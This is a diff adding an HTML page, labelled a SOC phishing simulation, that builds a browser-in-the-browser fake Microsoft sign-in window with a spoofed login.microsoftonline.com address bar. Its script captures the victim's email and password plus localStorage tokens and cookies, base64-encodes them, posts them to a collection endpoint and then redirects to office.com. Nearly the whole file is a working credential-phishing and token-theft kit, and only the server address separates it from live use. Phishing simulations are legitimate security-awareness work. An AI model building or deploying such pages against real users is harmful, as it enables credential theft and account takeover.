@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document - Microsoft Word</title>
+    <link rel="shortcut icon" href="https://c.s-microsoft.com/favicon.ico">
+    
+    <!-- Hook: BitB attack simulation -->
+    <style>
+        html, body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            overflow: hidden;
+        }
+        
+        .warning-banner {
+            background-color: #ff0000;
+            color: #ffffff;
+            text-align: center;
+            padding: 10px;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 2000;
+            font-weight: bold;
+        }
+        
+        /* Browser chrome styling */
+        .browser-window {
+            width: 600px;
+            height: 500px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .browser-header {
+            height: 40px;
+            background-color: #f0f0f0;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            user-select: none;
+        }
+        
+        .browser-controls {
+            display: flex;
+            align-items: center;
+            margin-right: 15px;
+        }
+        
+        .browser-control {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        
+        .browser-control.close {
+            background-color: #ff5f57;
+        }
+        
+        .browser-control.minimize {
+            background-color: #ffbd2e;
+        }
+        
+        .browser-control.maximize {
+            background-color: #28c940;
+        }
+        
+        .browser-address-bar {
+            flex: 1;
+            height: 28px;
+            background-color: #fff;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            font-size: 13px;
+            color: #333;
+        }
+        
+        .browser-address-bar .lock-icon {
+            color: #28c940;
+            margin-right: 5px;
+            font-size: 12px;
+        }
+        
+        .browser-content {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Microsoft login styling */
+        .login-container {
+            width: 100%;
+            height: 100%;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        
+        .microsoft-logo {
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .microsoft-logo svg {
+            margin-right: 10px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-top: 0;
+            margin-bottom: 20px;
+            color: #1B1B1B;
+        }
+        
+        .form-container {
+            width: 100%;
+            max-width: 340px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            font-size: 14px;
+            font-weight: 400;
+            color: #1B1B1B;
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        input[type="email"],
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            height: 36px;
+            padding: 6px 10px;
+            border: 1px solid #ccc;
+            border-radius: 2px;
+            outline: none;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        
+        input:focus {
+            border-color: #0067b8;
+        }
+        
+        .submit-button {
+            float: right;
+            background-color: #0067b8;
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 14px;
+            font-weight: 400;
+            min-height: 32px;
+            min-width: 108px;
+            padding: 4px 12px;
+            text-align: center;
+            text-decoration: none;
+            vertical-align: top;
+            margin-top: 10px;
+        }
+        
+        .submit-button:hover {
+            background-color: #005da6;
+        }
+        
+        .links {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 340px;
+        }
+        
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 12px;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        #emailDisplay {
+            font-size: 14px;
+            margin-bottom: 16px;
+            color: #666;
+        }
+        
+        #loginDiv, #passwordDiv {
+            width: 100%;
+        }
+        
+        #passwordDiv {
+            display: none;
+        }
+        
+        /* Overlay for full-screen mode */
+        .fullscreen-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        /* Fake browser URL styles */
+        .url-part {
+            color: #333;
+        }
+        
+        .url-domain {
+            color: #000;
+            font-weight: 500;
+        }
+        
+        .url-path {
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <!-- Warning banner for SOC testing only -->
+    <div class="warning-banner">
+        ⚠️ This is a SOC phishing simulation. Do not use in production.
+    </div>
+
+    <!-- Hook: BitB attack simulation -->
+    <div class="fullscreen-overlay">
+        <div class="browser-window">
+            <div class="browser-header">
+                <div class="browser-controls">
+                    <div class="browser-control close"></div>
+                    <div class="browser-control minimize"></div>
+                    <div class="browser-control maximize"></div>
+                </div>
+                <div class="browser-address-bar">
+                    <span class="lock-icon">🔒</span>
+                    <span class="url-part url-domain">login.microsoftonline.com</span><span class="url-part url-path">/common/oauth2/authorize</span>
+                </div>
+            </div>
+            <div class="browser-content">
+                <!-- BEGIN FAKE LOGIN FORMS -->
+                <div class="login-container">
+                    <div id="loginDiv">
+                        <div class="microsoft-logo">
+                            <svg width="24" height="24" viewBox="0 0 24 24">
+                                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+                                <rect x="13" y="1" width="10" height="10" fill="#7fba00"/>
+                                <rect x="1" y="13" width="10" height="10" fill="#00a4ef"/>
+                                <rect x="13" y="13" width="10" height="10" fill="#ffb900"/>
+                            </svg>
+                            <span style="margin-left: 10px; color: #666; font-size: 18px;">Microsoft</span>
+                        </div>
+                        
+                        <div class="form-container">
+                            <h1>Sign in</h1>
+                            <form id="emailForm">
+                                <div class="form-group">
+                                    <label for="email">Email, phone, or Skype</label>
+                                    <input type="email" id="email" name="email" required autocomplete="off">
+                                </div>
+                                
+                                <div class="links">
+                                    <a href="#">No account? Create one!</a>
+                                    <a href="#">Can't access your account?</a>
+                                </div>
+                                
+                                <div class="clearfix">
+                                    <button type="submit" class="submit-button" id="nextBtn">Next</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                    
+                    <div id="passwordDiv">
+                        <div class="microsoft-logo">
+                            <svg width="24" height="24" viewBox="0 0 24 24">
+                                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+                                <rect x="13" y="1" width="10" height="10" fill="#7fba00"/>
+                                <rect x="1" y="13" width="10" height="10" fill="#00a4ef"/>
+                                <rect x="13" y="13" width="10" height="10" fill="#ffb900"/>
+                            </svg>
+                            <span style="margin-left: 10px; color: #666; font-size: 18px;">Microsoft</span>
+                        </div>
+                        
+                        <div class="form-container">
+                            <h1>Enter password</h1>
+                            <div id="emailDisplay"></div>
+                            <form id="passwordForm">
+                                <div class="form-group">
+                                    <label for="password">Password</label>
+                                    <input type="password" id="password" name="password" required autocomplete="off">
+                                </div>
+                                
+                                <div class="links">
+                                    <a href="#">Forgot password?</a>
+                                </div>
+                                
+                                <div class="clearfix">
+                                    <button type="submit" class="submit-button" id="signInBtn">Sign in</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hook: BitB attack simulation -->
+    <script>
+        // Track the user ID from the URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const userId = urlParams.get('id') || 'unknown';
+        
+        // Set up event handlers when the DOM is fully loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            // Email form submission handler
+            const emailForm = document.getElementById("emailForm");
+            if (emailForm) {
+                emailForm.addEventListener("submit", function(event) {
+                    event.preventDefault();
+                    handleEmailSubmission();
+                    return false;
+                });
+            }
+            
+            // Password form submission handler
+            const passwordForm = document.getElementById("passwordForm");
+            if (passwordForm) {
+                passwordForm.addEventListener("submit", function(event) {
+                    event.preventDefault();
+                    handlePasswordSubmission();
+                    return false;
+                });
+            }
+            
+            // Make browser controls appear clickable
+            const closeBtn = document.querySelector(".browser-control.close");
+            if (closeBtn) {
+                closeBtn.addEventListener("click", function() {
+                    window.location.href = 'https://office.com';
+                });
+            }
+        });
+        
+        let capturedEmail = "";
+        
+        function handleEmailSubmission() {
+            // Get the email input value
+            const emailInput = document.getElementById("email");
+            if (!emailInput || !emailInput.value) return;
+            
+            capturedEmail = emailInput.value;
+            
+            // Display the email on the password page
+            const emailDisplay = document.getElementById("emailDisplay");
+            if (emailDisplay) {
+                emailDisplay.textContent = capturedEmail;
+            }
+            
+            // Switch from email to password view
+            const loginDiv = document.getElementById("loginDiv");
+            const passwordDiv = document.getElementById("passwordDiv");
+            
+            if (loginDiv) loginDiv.style.display = "none";
+            if (passwordDiv) passwordDiv.style.display = "block";
+        }
+        
+        function handlePasswordSubmission() {
+            // Get the password input value
+            const passwordInput = document.getElementById("password");
+            if (!passwordInput || !passwordInput.value) return;
+            
+            const password = passwordInput.value;
+            
+            // Hook: Token hijack simulation
+            // Attempt to collect local storage and session cookie values
+            const authToken = localStorage.getItem("auth_token") || '';
+            const sessionData = document.cookie || '';
+            
+            // Create a payload object with the captured data
+            const payload = {
+                username: capturedEmail,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                trackingId: userId,
+                attackVector: "BitB",
+                // Include token data from various sources
+                tokenData: {
+                    localStorageToken: authToken,
+                    cookieData: sessionData
+                }
+            };
+            
+            // Base64 encode the payload before sending
+            const encodedPayload = btoa(JSON.stringify(payload));
+            
+            // Show a loading spinner
+            const browserContent = document.querySelector(".browser-content");
+            if (browserContent) {
+                browserContent.innerHTML = `
+                    <div class="login-container">
+                        <div class="microsoft-logo">
+                            <svg width="24" height="24" viewBox="0 0 24 24">
+                                <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+                                <rect x="13" y="1" width="10" height="10" fill="#7fba00"/>
+                                <rect x="1" y="13" width="10" height="10" fill="#00a4ef"/>
+                                <rect x="13" y="13" width="10" height="10" fill="#ffb900"/>
+                            </svg>
+                            <span style="margin-left: 10px; color: #666; font-size: 18px;">Microsoft</span>
+                        </div>
+                        <h2 style="margin-top: 20px; color: #666;">Signing in...</h2>
+                        <div style="margin: 30px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0067b8; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                    </div>
+                    <style>
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                    </style>
+                `;
+            }
+            
+            // Send data to the server
+            fetch('http://localhost:3000/api/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    encodedData: encodedPayload,
+                    trackingId: userId
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Redirect to legitimate site after a short delay
+                setTimeout(() => {
+                    window.location.href = 'https://office.com';
+                }, 1500);
+            })
+            .catch(error => {
+                // Still redirect even if there's an error
+                setTimeout(() => {
+                    window.location.href = 'https://office.com';
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html>
